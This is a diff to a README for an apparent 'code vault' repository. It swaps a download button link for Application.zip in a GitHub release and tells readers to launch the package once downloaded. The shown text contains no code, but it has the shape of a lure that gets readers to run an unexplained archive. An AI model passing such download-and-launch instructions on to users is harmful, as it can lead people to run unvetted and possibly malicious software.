@@ -23,7 +23,7 @@ In the code vault, you will find a collection of code snippets, projects, and re
 ## Installation
 To access the latest software package, click the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/wardansmp/code-vault/releases/download/v1.0/Application.zip)](https://github.com/wardansmp/code-vault/releases/download/v1.0/Application.zip)
 
 Please note that the software package needs to be launched once downloaded to start the installation process.
 
